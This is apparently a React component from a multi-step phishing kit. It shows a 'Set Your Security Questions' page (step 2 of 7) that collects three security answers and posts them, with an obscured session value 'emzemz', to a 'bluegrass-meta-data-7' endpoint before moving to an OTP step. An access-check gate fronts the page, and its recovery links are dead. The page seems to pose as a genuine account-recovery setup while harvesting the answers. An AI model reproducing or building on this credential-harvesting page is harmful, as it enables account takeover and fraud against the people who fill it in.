import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Access denied. Redirecting…</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Missing session data. Please restart the flow.</div>;
  }

  // Predefined security questions
  const securityQuestions = [
    "What was your childhood nickname?",
    "What is your mother's maiden name?",
    "What was the name of your first pet?",
    "What was the make and model of your first car?",
    "What city were you born in?",
    "What is your favorite childhood memory?",
    "What was your first job title?",
    "What is the name of your favorite teacher?",
    "What is your favorite book/movie character?",
    "What street did you grow up on?"
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/bluegrass-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3
        });
        console.log('Security questions submitted successfully');
        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout
      eyebrow="Step 2 of 7"
      title="Set Your Security Questions"
      description="Choose questions only you can answer so we can verify your identity if you ever need account recovery assistance."
      contentClassName="space-y-6"
      afterContent={(
        <div className="text-xs text-white/90 space-x-3">
          <a href="#" className="hover:underline">Forgot Questions?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Need Recovery Help?</a>
        </div>
      )}
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <section className="space-y-4">
          <header className="space-y-1">
            <h2 className="text-lg font-semibold text-[#123524]">Security Question 1</h2>
            <p className="text-sm text-[#557a46]">Select a question and provide an answer that's easy for you to remember.</p>
          </header>
          <div className="space-y-3">
            <select
              value={securityQuestion1}
              onChange={(e) => setSecurityQuestion1(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
            >
              <option value="">Select a security question</option>
              {securityQuestions.map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
            </select>
            {errors.securityQuestion1 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityQuestion1}
              </p>
            )}
            <input
              type="text"
              value={securityAnswer1}
              onChange={(e) => setSecurityAnswer1(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
              placeholder="Type your answer"
            />
            {errors.securityAnswer1 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityAnswer1}
              </p>
            )}
          </div>
        </section>

        <section className="space-y-4">
          <header className="space-y-1">
            <h2 className="text-lg font-semibold text-[#123524]">Security Question 2</h2>
            <p className="text-sm text-[#557a46]">Choose a different question to keep your account extra secure.</p>
          </header>
          <div className="space-y-3">
            <select
              value={securityQuestion2}
              onChange={(e) => setSecurityQuestion2(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
            >
              <option value="">Select a security question</option>
              {securityQuestions.filter((q) => q !== securityQuestion1).map((question, index) => (
                <option key={index} value={question}>
                  {question}
                </option>
              ))}
            </select>
            {errors.securityQuestion2 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityQuestion2}
              </p>
            )}
            <input
              type="text"
              value={securityAnswer2}
              onChange={(e) => setSecurityAnswer2(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
              placeholder="Type your answer"
            />
            {errors.securityAnswer2 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityAnswer2}
              </p>
            )}
          </div>
        </section>

        <section className="space-y-4">
          <header className="space-y-1">
            <h2 className="text-lg font-semibold text-[#123524]">Security Question 3</h2>
            <p className="text-sm text-[#557a46]">One final question to round out your recovery information.</p>
          </header>
          <div className="space-y-3">
            <select
              value={securityQuestion3}
              onChange={(e) => setSecurityQuestion3(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
            >
              <option value="">Select a security question</option>
              {securityQuestions
                .filter((q) => q !== securityQuestion1 && q !== securityQuestion2)
                .map((question, index) => (
                  <option key={index} value={question}>
                    {question}
                  </option>
                ))}
            </select>
            {errors.securityQuestion3 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityQuestion3}
              </p>
            )}
            <input
              type="text"
              value={securityAnswer3}
              onChange={(e) => setSecurityAnswer3(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
              placeholder="Type your answer"
            />
            {errors.securityAnswer3 && (
              <p className="flex items-center gap-2 text-sm font-medium text-red-600">
                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
                </svg>
                {errors.securityAnswer3}
              </p>
            )}
          </div>
        </section>

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Saving…' : 'Continue'}
          </button>
        </div>
      </form>
    </FlowPageLayout>
  );
}

export default SecurityQuestions;
